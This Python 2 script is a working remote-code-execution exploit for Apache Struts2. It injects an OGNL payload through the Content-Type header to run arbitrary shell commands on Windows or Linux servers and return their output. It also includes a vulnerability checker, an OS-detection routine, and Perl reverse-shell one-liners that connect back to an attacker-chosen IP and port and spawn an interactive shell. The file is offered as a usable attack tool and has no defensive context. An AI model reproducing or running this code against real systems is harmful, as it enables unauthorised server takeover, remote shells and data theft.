import random
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(url, cmd):
    if "$jk" in cmd:
        cmd = cmd.replace("$jk","")
    else:
        cmd = cmd+";echo 1337separaror"
        
    if not "uname" in cmd:
        print '\n[*]Url: %s'%(url)
        print '[*]Cmd: %s'%(cmd.replace(";echo 1337separaror",""))
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"


    headers = {'User-Agent': 'Mozilla/5.0',
               'Content-Type': payload,
               'Accept':'*\*'
               }

    timeout = 10
    try:
        try:
            output = requests.get(url,headers=headers,verify=False,timeout=timeout,allow_redirects=False).text.split("1337separaror")[0]
        except:
            output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text

    except Exception, e :
        print '[Exception] %s' % (str(e))
        output = "ERRO"
    return output



def os_detect(url):
    cmd = "uname"
    resp = exploit(url,cmd)
    if 'Linux' in resp or 'Darwin' in resp:
        return url,"Linux OS"
    elif 'uname' in resp:
        return url,"Windows OS"
    else:
        return url,"?"

def shell_perl_linux(ip,port):
    cmd = "perl -e 'use "
    cmd += "Socket;"
    cmd += "$i=\""+ip+"\";"
    cmd += "$p="+port+";"
    cmd += "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
    cmd += "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
    cmd += "open(STDOUT,\">&S\");"
    cmd += "open(STDERR,\">&S\");"
    cmd += "exec(\"/bin/sh -i\");};'"
    return cmd
def shell_perl_windows(ip,port):
    cmd = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\""+ip+":"+port+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    return cmd

def vul_check(url):
    result = False
    random_str = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz'))
    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
    payload += "addHeader('%s','%s')}.multipart/form-data"%(random_str,random_str)

    headers = {'User-Agent': 'Mozilla/5.0',
               'Content-Type': payload,
               'Accept': '*\*'
               }
    timeout = 5
    try:
        resp = requests.get(url,headers=headers,verify=False,timeout=timeout,allow_redirects=False)
        if ((random_str in resp.headers.keys()) and  (resp.headers[random_str] == random_str)):
            result = True
        else:
            result = False
    except Exception,e:
        #print '[Exception] %s'%(str(e))
        pass
    return (result,url)


